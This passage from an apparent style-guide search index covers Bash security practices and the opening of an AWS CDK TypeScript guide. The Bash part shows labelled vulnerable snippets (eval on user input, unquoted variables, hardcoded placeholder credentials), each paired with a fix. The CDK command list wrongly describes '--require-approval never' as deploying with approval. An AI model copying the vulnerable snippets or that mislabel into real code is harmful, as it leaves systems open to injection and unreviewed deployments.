track test quality:</p> <pre><code>## tests/coverage.sh\n#!/bin/sh\n\n# Count functions in scripts\ntotal_functions=$(grep -r \"^[a-z_]*() {\" scripts/ | wc -l)\n\n# Count tested functions\ntested_functions=$(grep -r \"@test.*function\" tests/ | wc -l)\n\n# Calculate coverage percentage\ncoverage=$((tested_functions * 100 / total_functions))\n\necho \"Function Test Coverage: ${coverage}%\"\necho \"Total Functions: $total_functions\"\necho \"Tested Functions: $tested_functions\"\n\nif [ \"$coverage\" -lt 80 ]; then\n  echo \"ERROR: Coverage below 80% threshold\"\n  exit 1\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#security-best-practices","title":"Security Best Practices","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#command-injection-prevention","title":"Command Injection Prevention","text":"<p>Always quote variables and validate input to prevent command injection attacks.</p> <pre><code>## Bad - Vulnerable to command injection\nuser_input=\"$1\"\neval \"ls $user_input\"  # NEVER use eval with user input!\nfiles=$(find . -name $user_input)  # Unquoted variable vulnerable\n\n## Good - Properly quoted and validated\nuser_input=\"$1\"\n\n# Validate input matches expected pattern\nif ! printf '%s\\n' \"$user_input\" | grep -Eq '^[a-zA-Z0-9_-]+$'; then\n  echo \"Error: Invalid input format\" &gt;&amp;2\n  exit 1\nfi\n\n# Always quote variables\nfiles=$(find . -name \"$user_input\")\n\n## Better - Use arrays for complex commands\nsearch_paths=(\"/var/log\" \"/var/tmp\")\nfind \"${search_paths[@]}\" -name \"*.log\"\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#input-validation-and-sanitization","title":"Input Validation and Sanitization","text":"<pre><code>## Validate file paths\nvalidate_path() {\n  local path=\"$1\"\n\n  # Check for path traversal attempts\n  case \"$path\" in\n    *..*)\n      echo \"Error: Path traversal detected\" &gt;&amp;2\n      return 1\n      ;;\n    /*)\n      echo \"Error: Absolute paths not allowed\" &gt;&amp;2\n      return 1\n      ;;\n  esac\n\n  # Check path exists and is within allowed directory\n  if [ ! -e \"$path\" ]; then\n    echo \"Error: Path does not exist\" &gt;&amp;2\n    return 1\n  fi\n\n  return 0\n}\n\n## Validate numeric input\nvalidate_number() {\n  local input=\"$1\"\n\n  case \"$input\" in\n    ''|*[!0-9]*)\n      echo \"Error: Not a valid number\" &gt;&amp;2\n      return 1\n      ;;\n  esac\n\n  return 0\n}\n\n## Example usage\nuser_file=\"$1\"\nif validate_path \"$user_file\"; then\n  cat \"$user_file\"\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#secure-credential-management","title":"Secure Credential Management","text":"<pre><code>## Bad - Hardcoded credentials (NEVER DO THIS)\nDB_PASSWORD=\"supersecret123\"\nAPI_KEY=\"sk_live_abc123\"\naws_access_key=\"AKIAIOSFODNN7EXAMPLE\"\n\n## Good - Use environment variables\nDB_PASSWORD=\"${DB_PASSWORD:?Database password not set}\"\nAPI_KEY=\"${API_KEY:?API key not set}\"\n\n## Good - Read from secure file with restricted permissions\nread_secret() {\n  local secret_file=\"$1\"\n\n  # Verify file permissions (should be 600 or 400)\n  if [ -f \"$secret_file\" ]; then\n    perms=$(stat -c '%a' \"$secret_file\" 2&gt;/dev/null || stat -f '%A' \"$secret_file\" 2&gt;/dev/null)\n    if [ \"$perms\" != \"600\" ] &amp;&amp; [ \"$perms\" != \"400\" ]; then\n      echo \"Error: Secret file has insecure permissions: $perms\" &gt;&amp;2\n      return 1\n    fi\n    cat \"$secret_file\"\n  else\n    echo \"Error: Secret file not found\" &gt;&amp;2\n    return 1\n  fi\n}\n\n## Use secrets\ndb_password=$(read_secret \"/run/secrets/db_password\")\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#secure-temporary-file-handling","title":"Secure Temporary File Handling","text":"<pre><code>## Bad - Predictable temp file names (race condition vulnerability)\ntmp_file=\"/tmp/myapp.txt\"\necho \"data\" &gt; \"$tmp_file\"  # Attacker can predict this!\n\n## Good - Use mktemp for secure temporary files\ntmp_file=$(mktemp) || exit 1\ntrap 'rm -f \"$tmp_file\"' EXIT INT TERM\n\necho \"sensitive data\" &gt; \"$tmp_file\"\nchmod 600 \"$tmp_file\"  # Restrict permissions\n\n## Process temp file\n# ...\n\n## Cleanup handled by trap\n\n## Good - Temporary directory\ntmp_dir=$(mktemp -d) || exit 1\ntrap 'rm -rf \"$tmp_dir\"' EXIT INT TERM\n\n# Work in temporary directory\ncd \"$tmp_dir\" || exit 1\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#safe-file-operations","title":"Safe File Operations","text":"<pre><code>## Prevent symlink attacks\nsafe_write() {\n  local target_file=\"$1\"\n  local content=\"$2\"\n\n  # Check if file is a symlink\n  if [ -L \"$target_file\" ]; then\n    echo \"Error: Will not write to symlink\" &gt;&amp;2\n    return 1\n  fi\n\n  # Create file with restrictive permissions\n  (umask 077 &amp;&amp; printf '%s\\n' \"$content\" &gt; \"$target_file\")\n}\n\n## Safely delete files\nsafe_delete() {\n  local file=\"$1\"\n\n  # Verify file exists and is a regular file\n  if [ ! -f \"$file\" ]; then\n    echo \"Error: Not a regular file\" &gt;&amp;2\n    return 1\n  fi\n\n  # Check we're not deleting system files\n  case \"$file\" in\n    /bin/*|/sbin/*|/usr/bin/*|/usr/sbin/*|/etc/*)\n      echo \"Error: Refusing to delete system file\" &gt;&amp;2\n      return 1\n      ;;\n  esac\n\n  rm -f \"$file\"\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#secure-downloads","title":"Secure Downloads","text":"<pre><code>## Download files securely with verification\nsecure_download() {\n  local url=\"$1\"\n  local output=\"$2\"\n  local expected_checksum=\"$3\"\n\n  # Download with timeout and fail on error\n  if ! curl --fail --silent --show-error --max-time 300 \\\n            --location \"$url\" --output \"$output\"; then\n    echo \"Error: Download failed\" &gt;&amp;2\n    return 1\n  fi\n\n  # Verify checksum if provided\n  if [ -n \"$expected_checksum\" ]; then\n    actual_checksum=$(sha256sum \"$output\" | cut -d' ' -f1)\n    if [ \"$actual_checksum\" != \"$expected_checksum\" ]; then\n      echo \"Error: Checksum mismatch\" &gt;&amp;2\n      echo \"Expected: $expected_checksum\" &gt;&amp;2\n      echo \"Got: $actual_checksum\" &gt;&amp;2\n      rm -f \"$output\"\n      return 1\n    fi\n  fi\n\n  return 0\n}\n\n## Example usage\nurl=\"https://example.com/package.tar.gz\"\nchecksum=\"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\"\nsecure_download \"$url\" \"package.tar.gz\" \"$checksum\"\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#logging-sensitive-data","title":"Logging Sensitive Data","text":"<pre><code>## Bad - Logging passwords and secrets\necho \"Connecting to database with password: $DB_PASSWORD\"  # NEVER!\ncurl -v \"https://api.example.com?api_key=$API_KEY\"  # Logged in curl output!\n\n## Good - Redact sensitive information\nlog_safe() {\n  local message=\"$1\"\n  # Redact potential secrets (credit cards, API keys, tokens)\n  echo \"$message\" | sed -E \\\n    -e 's/password[=:][^ ]*/password=***REDACTED***/gi' \\\n    -e 's/api[_-]?key[=:][^ ]*/api_key=***REDACTED***/gi' \\\n    -e 's/token[=:][^ ]*/token=***REDACTED***/gi' \\\n    -e 's/[0-9]{13,19}/****-****-****-****/g'  # Credit card numbers\n}\n\n## Use for logging\nmessage=\"Connecting to API with api_key=sk_live_abc123\"\nlog_safe \"$message\"  # Outputs: Connecting to API with api_key=***REDACTED***\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#process-isolation","title":"Process Isolation","text":"<pre><code>## Run untrusted commands with limited permissions\nrun_sandboxed() {\n  local command=\"$1\"\n\n  # Create restricted user if needed\n  if ! id sandbox-user &gt;/dev/null 2&gt;&amp;1; then\n    useradd -r -s /bin/false sandbox-user\n  fi\n\n  # Run command as limited user with timeout\n  sudo -u sandbox-user timeout 30s sh -c \"$command\"\n}\n\n## Limit resource usage\nulimit -t 30      # CPU time limit (seconds)\nulimit -v 1000000 # Virtual memory limit (KB)\nulimit -f 10000   # File size limit (blocks)\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#when-to-use-higher-level-languages","title":"When to Use Higher-Level Languages","text":"<p>Replace Bash with Python, Go, or TypeScript when you need:</p>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#use-python-when","title":"Use Python When","text":"<ul> <li>Parsing JSON/YAML configuration files</li> <li>Making HTTP API calls</li> <li>Complex data transformations</li> <li>String manipulation beyond basic patterns</li> <li>Scripts requiring unit tests</li> <li>Cross-platform compatibility</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#use-go-when","title":"Use Go When","text":"<ul> <li>Building compiled binaries for distribution</li> <li>Performance is critical</li> <li>Strong typing needed</li> <li>Concurrent operations required</li> <li>Building CLI tools with subcommands</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#use-typescriptnodejs-when","title":"Use TypeScript/Node.js When","text":"<ul> <li>Integrating with JavaScript ecosystems</li> <li>Processing JSON extensively</li> <li>Building CLI tools with rich UX</li> <li>Async I/O operations</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#example-when-not-to-use-bash","title":"Example: When NOT to Use Bash","text":"<pre><code>## Bad - Complex JSON parsing in Bash\n## This should be Python/Go/TypeScript\nresponse=$(curl -s https://api.example.com/users)\n## Trying to parse JSON with grep/sed is fragile and error-prone\nuser_id=$(echo \"$response\" | grep -o '\"id\":[0-9]*' | cut -d: -f2)\n</code></pre> <pre><code>## Good - Use Python for JSON APIs\nimport requests\n\nresponse = requests.get('https://api.example.com/users')\ndata = response.json()\nuser_id = data['id']\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#references","title":"References","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#official-documentation","title":"Official Documentation","text":"<ul> <li>POSIX Shell Specification</li> <li>Bash Reference Manual</li> <li>Google Shell Style Guide</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#tools","title":"Tools","text":"<ul> <li>shellcheck - Shell script static analysis tool</li> <li>shfmt - Shell script formatter</li> <li>bats - Bash Automated Testing System</li> </ul>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#best-practices","title":"Best Practices","text":"<ul> <li>Bash Pitfalls</li> <li>Safe Ways to do Things in Bash</li> <li>Bash Strict Mode</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/cdk/","title":"AWS CDK Style Guide","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#language-overview","title":"Language Overview","text":"<p>AWS Cloud Development Kit (CDK) is an infrastructure as code framework that lets you define cloud resources using familiar programming languages. This guide focuses on TypeScript CDK, covering best practices for creating maintainable, reusable infrastructure code.</p>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Languages: TypeScript (preferred), Python, Java, C#, Go</li> <li>Primary Use: Infrastructure as code on AWS</li> <li>Key Concepts: Apps, Stacks, Constructs, Props</li> <li>Version: CDK v2 (recommended)</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Apps <code>PascalCase</code> <code>MyInfraApp</code> CDK application class Stacks <code>PascalCase</code> <code>VpcStack</code>, <code>DatabaseStack</code> Stack class names Constructs <code>PascalCase</code> <code>ApiGateway</code>, <code>LambdaFunction</code> Custom construct classes Props Interfaces <code>PascalCaseProps</code> <code>VpcStackProps</code>, <code>ApiProps</code> Props interface suffix Resources <code>camelCase</code> <code>myBucket</code>, <code>userTable</code> Resource variables File Naming App Entry <code>bin/app-name.ts</code> <code>bin/my-app.ts</code> Application entry point Stacks <code>lib/stack-name-stack.ts</code> <code>lib/vpc-stack.ts</code> Stack definitions Constructs <code>lib/construct-name.ts</code> <code>lib/api-gateway.ts</code> Reusable constructs Key Concepts App Top-level container <code>new cdk.App()</code> CDK application Stack Deployment unit <code>new cdk.Stack(app, 'MyStack')</code> CloudFormation stack Construct Reusable component Custom infrastructure patterns Building blocks Props Configuration Interfaces for construct config Type-safe configuration Best Practices CDK v2 Use CDK v2 <code>aws-cdk-lib</code> Single package TypeScript Preferred language Type safety, IDE support Better developer experience Constructs L3 &gt; L2 &gt; L1 Use higher-level constructs Opinionated patterns Environment Pass explicitly <code>env: { account, region }</code> Avoid implicit environments Props Required vs optional Use TypeScript optionals Clear interfaces Common Patterns Stacks One stack per env <code>VpcStack</code>, <code>AppStack</code> Logical separation Cross-Stack Refs Export/import <code>stack.export()</code> Share resources Context Use cdk.json Configuration values Environment-specific config","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#project-structure","title":"Project Structure","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#basic-cdk-project","title":"Basic CDK Project","text":"<pre><code>my-cdk-app/\n\u251c\u2500\u2500 bin/\n\u2502   \u2514\u2500\u2500 my-cdk-app.ts          # App entry point\n\u251c\u2500\u2500 lib/\n\u2502   \u251c\u2500\u2500 my-cdk-app-stack.ts    # Stack definitions\n\u2502   \u251c\u2500\u2500 constructs/             # Custom constructs\n\u2502   \u2502   \u251c\u2500\u2500 api-construct.ts\n\u2502   \u2502   \u2514\u2500\u2500 database-construct.ts\n\u2502   \u2514\u2500\u2500 config/                 # Configuration\n\u2502       \u251c\u2500\u2500 dev.ts\n\u2502       \u2514\u2500\u2500 prod.ts\n\u251c\u2500\u2500 test/\n\u2502   \u2514\u2500\u2500 my-cdk-app.test.ts     # Tests\n\u251c\u2500\u2500 cdk.json                    # CDK configuration\n\u251c\u2500\u2500 package.json\n\u2514\u2500\u2500 tsconfig.json\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#basic-stack","title":"Basic Stack","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#simple-stack-definition","title":"Simple Stack Definition","text":"<pre><code>import * as cdk from 'aws-cdk-lib';\nimport { Construct } from 'constructs';\nimport * as s3 from 'aws-cdk-lib/aws-s3';\n\nexport class MyStack extends cdk.Stack {\n  constructor(scope: Construct, id: string, props?: cdk.StackProps) {\n    super(scope, id, props);\n\n    // Create S3 bucket\n    new s3.Bucket(this, 'MyBucket', {\n      bucketName: 'my-app-bucket',\n      versioned: true,\n      encryption: s3.BucketEncryption.S3_MANAGED,\n      removalPolicy: cdk.RemovalPolicy.DESTROY,\n      autoDeleteObjects: true,\n    });\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#app-entry-point","title":"App Entry Point","text":"<pre><code>#!/usr/bin/env node\nimport 'source-map-support/register';\nimport * as cdk from 'aws-cdk-lib';\nimport { MyStack } from '../lib/my-cdk-app-stack';\n\nconst app = new cdk.App();\n\nnew MyStack(app, 'MyStack', {\n  env: {\n    account: process.env.CDK_DEFAULT_ACCOUNT,\n    region: process.env.CDK_DEFAULT_REGION,\n  },\n  tags: {\n    Environment: 'production',\n    ManagedBy: 'CDK',\n  },\n});\n\napp.synth();\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#constructs","title":"Constructs","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#l1-constructs-cloudformation-resources","title":"L1 Constructs (CloudFormation Resources)","text":"<pre><code>import * as cdk from 'aws-cdk-lib';\n\n// Raw CloudFormation resource\nconst cfnBucket = new cdk.aws_s3.CfnBucket(this, 'MyCfnBucket', {\n  bucketName: 'my-cfn-bucket',\n  versioningConfiguration: {\n    status: 'Enabled',\n  },\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#l2-constructs-aws-constructs-preferred","title":"L2 Constructs (AWS Constructs - Preferred)","text":"<pre><code>import * as s3 from 'aws-cdk-lib/aws-s3';\n\nconst bucket = new s3.Bucket(this, 'MyBucket', {\n  bucketName: 'my-app-bucket',\n  versioned: true,\n  encryption: s3.BucketEncryption.S3_MANAGED,\n  blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL,\n  removalPolicy: cdk.RemovalPolicy.DESTROY,\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#l3-constructs-custom-patterns","title":"L3 Constructs (Custom Patterns)","text":"<pre><code>import { Construct } from 'constructs';\nimport * as s3 from 'aws-cdk-lib/aws-s3';\nimport * as cloudfront from 'aws-cdk-lib/aws-cloudfront';\nimport * as origins from 'aws-cdk-lib/aws-cloudfront-origins';\n\nexport interface StaticWebsiteProps {\n  domainName: string;\n  certificateArn: string;\n}\n\nexport class StaticWebsite extends Construct {\n  public readonly bucket: s3.Bucket;\n  public readonly distribution: cloudfront.Distribution;\n\n  constructor(scope: Construct, id: string, props: StaticWebsiteProps) {\n    super(scope, id);\n\n    // S3 bucket for website content\n    this.bucket = new s3.Bucket(this, 'WebsiteBucket', {\n      websiteIndexDocument: 'index.html',\n      websiteErrorDocument: 'error.html',\n      publicReadAccess: false,\n      blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL,\n      removalPolicy: cdk.RemovalPolicy.DESTROY,\n      autoDeleteObjects: true,\n    });\n\n    // CloudFront distribution\n    this.distribution = new cloudfront.Distribution(this, 'Distribution', {\n      defaultBehavior: {\n        origin: new origins.S3Origin(this.bucket),\n        viewerProtocolPolicy: cloudfront.ViewerProtocolPolicy.REDIRECT_TO_HTTPS,\n      },\n      domainNames: [props.domainName],\n      certificate: acm.Certificate.fromCertificateArn(\n        this,\n        'Certificate',\n        props.certificateArn\n      ),\n    });\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#common-patterns","title":"Common Patterns","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#vpc-stack","title":"VPC Stack","text":"<pre><code>import * as ec2 from 'aws-cdk-lib/aws-ec2';\n\nexport class NetworkStack extends cdk.Stack {\n  public readonly vpc: ec2.Vpc;\n\n  constructor(scope: Construct, id: string, props?: cdk.StackProps) {\n    super(scope, id, props);\n\n    this.vpc = new ec2.Vpc(this, 'VPC', {\n      maxAzs: 3,\n      natGateways: 1,\n      subnetConfiguration: [\n        {\n          cidrMask: 24,\n          name: 'Public',\n          subnetType: ec2.SubnetType.PUBLIC,\n        },\n        {\n          cidrMask: 24,\n          name: 'Private',\n          subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,\n        },\n        {\n          cidrMask: 28,\n          name: 'Isolated',\n          subnetType: ec2.SubnetType.PRIVATE_ISOLATED,\n        },\n      ],\n    });\n\n    // Add VPC Flow Logs\n    this.vpc.addFlowLog('FlowLog', {\n      destination: ec2.FlowLogDestination.toCloudWatchLogs(),\n    });\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#rds-database-stack","title":"RDS Database Stack","text":"<pre><code>import * as rds from 'aws-cdk-lib/aws-rds';\nimport * as ec2 from 'aws-cdk-lib/aws-ec2';\nimport * as secretsmanager from 'aws-cdk-lib/aws-secretsmanager';\n\nexport class DatabaseStack extends cdk.Stack {\n  public readonly database: rds.DatabaseInstance;\n\n  constructor(scope: Construct, id: string, vpc: ec2.IVpc, props?: cdk.StackProps) {\n    super(scope, id, props);\n\n    // Security group\n    const dbSecurityGroup = new ec2.SecurityGroup(this, 'DatabaseSG', {\n      vpc,\n      description: 'Security group for RDS database',\n      allowAllOutbound: false,\n    });\n\n    // Database credentials\n    const dbCredentials = new secretsmanager.Secret(this, 'DBCredentials', {\n      generateSecretString: {\n        secretStringTemplate: JSON.stringify({ username: 'admin' }),\n        generateStringKey: 'password',\n        excludePunctuation: true,\n      },\n    });\n\n    // RDS instance\n    this.database = new rds.DatabaseInstance(this, 'Database', {\n      engine: rds.DatabaseInstanceEngine.postgres({\n        version: rds.PostgresEngineVersion.VER_15_3,\n      }),\n      instanceType: ec2.InstanceType.of(\n        ec2.InstanceClass.T3,\n        ec2.InstanceSize.MICRO\n      ),\n      vpc,\n      vpcSubnets: {\n        subnetType: ec2.SubnetType.PRIVATE_ISOLATED,\n      },\n      securityGroups: [dbSecurityGroup],\n      credentials: rds.Credentials.fromSecret(dbCredentials),\n      multiAz: true,\n      allocatedStorage: 100,\n      maxAllocatedStorage: 200,\n      backupRetention: cdk.Duration.days(7),\n      deletionProtection: true,\n      removalPolicy: cdk.RemovalPolicy.SNAPSHOT,\n    });\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#lambda-api-gateway-stack","title":"Lambda + API Gateway Stack","text":"<pre><code>import * as lambda from 'aws-cdk-lib/aws-lambda';\nimport * as apigateway from 'aws-cdk-lib/aws-apigateway';\nimport * as logs from 'aws-cdk-lib/aws-logs';\n\nexport class ApiStack extends cdk.Stack {\n  constructor(scope: Construct, id: string, props?: cdk.StackProps) {\n    super(scope, id, props);\n\n    // Lambda function\n    const handler = new lambda.Function(this, 'ApiHandler', {\n      runtime: lambda.Runtime.NODEJS_18_X,\n      code: lambda.Code.fromAsset('lambda'),\n      handler: 'index.handler',\n      environment: {\n        TABLE_NAME: 'my-table',\n      },\n      timeout: cdk.Duration.seconds(30),\n      memorySize: 512,\n      logRetention: logs.RetentionDays.ONE_WEEK,\n    });\n\n    // API Gateway\n    const api = new apigateway.RestApi(this, 'Api', {\n      restApiName: 'My API',\n      description: 'API Gateway for my application',\n      deployOptions: {\n        stageName: 'prod',\n        loggingLevel: apigateway.MethodLoggingLevel.INFO,\n        dataTraceEnabled: true,\n      },\n    });\n\n    const integration = new apigateway.LambdaIntegration(handler);\n\n    // Add resources and methods\n    const items = api.root.addResource('items');\n    items.addMethod('GET', integration);\n    items.addMethod('POST', integration);\n\n    const item = items.addResource('{id}');\n    item.addMethod('GET', integration);\n    item.addMethod('PUT', integration);\n    item.addMethod('DELETE', integration);\n\n    // Output API URL\n    new cdk.CfnOutput(this, 'ApiUrl', {\n      value: api.url,\n      description: 'API Gateway URL',\n    });\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#environment-configuration","title":"Environment Configuration","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#environment-specific-configuration","title":"Environment-Specific Configuration","text":"<pre><code>// lib/config/dev.ts\nexport const devConfig = {\n  env: {\n    account: '111111111111',\n    region: 'us-east-1',\n  },\n  tags: {\n    Environment: 'development',\n    CostCenter: 'Engineering',\n  },\n  vpc: {\n    maxAzs: 2,\n    natGateways: 1,\n  },\n  rds: {\n    instanceType: ec2.InstanceType.of(ec2.InstanceClass.T3, ec2.InstanceSize.MICRO),\n    multiAz: false,\n  },\n};\n\n// lib/config/prod.ts\nexport const prodConfig = {\n  env: {\n    account: '222222222222',\n    region: 'us-east-1',\n  },\n  tags: {\n    Environment: 'production',\n    CostCenter: 'Engineering',\n  },\n  vpc: {\n    maxAzs: 3,\n    natGateways: 3,\n  },\n  rds: {\n    instanceType: ec2.InstanceType.of(ec2.InstanceClass.R5, ec2.InstanceSize.LARGE),\n    multiAz: true,\n  },\n};\n\n// bin/my-cdk-app.ts\nimport { devConfig } from '../lib/config/dev';\nimport { prodConfig } from '../lib/config/prod';\n\nconst environment = process.env.ENVIRONMENT || 'dev';\nconst config = environment === 'prod' ? prodConfig : devConfig;\n\nnew MyStack(app, `MyStack-${environment}`, {\n  env: config.env,\n  tags: config.tags,\n  config,\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#testing","title":"Testing","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#unit-tests-with-jest","title":"Unit Tests with Jest","text":"<pre><code>import * as cdk from 'aws-cdk-lib';\nimport { Template } from 'aws-cdk-lib/assertions';\nimport { MyStack } from '../lib/my-cdk-app-stack';\n\ndescribe('MyStack', () =&gt; {\n  test('S3 Bucket Created', () =&gt; {\n    const app = new cdk.App();\n    const stack = new MyStack(app, 'TestStack');\n    const template = Template.fromStack(stack);\n\n    template.resourceCountIs('AWS::S3::Bucket', 1);\n\n    template.hasResourceProperties('AWS::S3::Bucket', {\n      VersioningConfiguration: {\n        Status: 'Enabled',\n      },\n    });\n  });\n\n  test('Bucket has encryption enabled', () =&gt; {\n    const app = new cdk.App();\n    const stack = new MyStack(app, 'TestStack');\n    const template = Template.fromStack(stack);\n\n    template.hasResourceProperties('AWS::S3::Bucket', {\n      BucketEncryption: {\n        ServerSideEncryptionConfiguration: [\n          {\n            ServerSideEncryptionByDefault: {\n              SSEAlgorithm: 'AES256',\n            },\n          },\n        ],\n      },\n    });\n  });\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#cdk-commands","title":"CDK Commands","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#common-commands","title":"Common Commands","text":"<pre><code>## Initialize new CDK project\ncdk init app --language typescript\n\n## Install dependencies\nnpm install\n\n## Synthesize CloudFormation template\ncdk synth\n\n## Diff against deployed stack\ncdk diff\n\n## Deploy stack\ncdk deploy\n\n## Deploy all stacks\ncdk deploy --all\n\n## Deploy with approval\ncdk deploy --require-approval never\n\n## Destroy stack\ncdk destroy\n\n## List all stacks\ncdk list\n\n## View documentation\ncdk doctor\n\n## Bootstrap environment (first time only)\ncdk bootstrap aws://ACCOUNT-NUMBER/REGION\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#best-practices","title":"Best Practices","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#use-stack-outputs","title":"Use Stack Outputs","text":"<pre><code>new cdk.CfnOutput(this, 'BucketName', {\n  value: bucket.bucketName,\n  description: 'The name of the S3 bucket',\n  exportName: 'MyBucketName',\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#tagging","title":"Tagging","text":"<pre><code>cdk.Tags.of(this).add('Project', 'MyProject');\ncdk.Tags.of(this).add('Owner', 'Platform Team');\ncdk.Tags.of(myResource).add('Critical', 'true');\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#removal-policies","title":"Removal Policies","text":"<pre><code>// Development - destroy resources\nnew s3.Bucket(this, 'DevBucket', {\n  removalPolicy: cdk.RemovalPolicy.DESTROY,\n  autoDeleteObjects: true,\n});\n\n// Production - retain resources\nnew s3.Bucket(this, 'ProdBucket', {\n  removalPolicy: cdk.RemovalPolicy.RETAIN,\n});\n\n// Snapshot before deletion\nnew rds.DatabaseInstance(this, 'Database', {\n  removalPolicy: cdk.RemovalPolicy.SNAPSHOT,\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#security-best-practices","title":"Security Best Practices","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#never-hardcode-secrets","title":"Never Hardcode Secrets","text":"<p>Avoid storing sensitive data in CDK code:</p> <pre><code>// Bad - Hardcoded secrets\nconst database = new rds.DatabaseInstance(this, 'Database', {\n  masterUsername: 'admin',\n  masterPassword: 'MySecretPassword123',  // \u274c Exposed in code!\n});\n\n// Good - Use Secrets Manager\nconst dbSecret = new secretsmanager.Secret(this, 'DBSecret', {\n  generateSecretString: {\n    secretStringTemplate: JSON.stringify({ username: 'admin' }),\n    generateStringKey: 'password',\n    excludePunctuation: true,\n  },\n});\n\nconst database = new rds.DatabaseInstance(this, 'Database', {\n  credentials: rds.Credentials.fromSecret(dbSecret),  // \u2705 From Secrets Manager\n});\n\n// Good - Reference existing secrets\nconst apiKey = secretsmanager.Secret.fromSecretNameV2(\n  this,\n  'ApiKey',\n  'prod/api-key'\n);\n</code></pre> <p>Key Points:</p> <ul> <li>Never hardcode credentials in CDK code</li> <li>Use AWS Secrets Manager for secrets</li> <li>Reference secrets, don't embed them</li> <li>Rotate secrets automatically</li> <li>Use IAM roles instead of access keys</li> <li>Audit secret access</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#encryption-at-rest-and-in-transit","title":"Encryption at Rest and in Transit","text":"<p>Enable encryption for all data:</p> <pre><code>// Good - S3 encryption\nconst bucket = new s3.Bucket(this, 'Bucket', {\n  encryption: s3.BucketEncryption.S3_MANAGED,  // \u2705 Server-side encryption\n  // Or use KMS for more control:\n  // encryption: s3.BucketEncryption.KMS,\n  // encryptionKey: 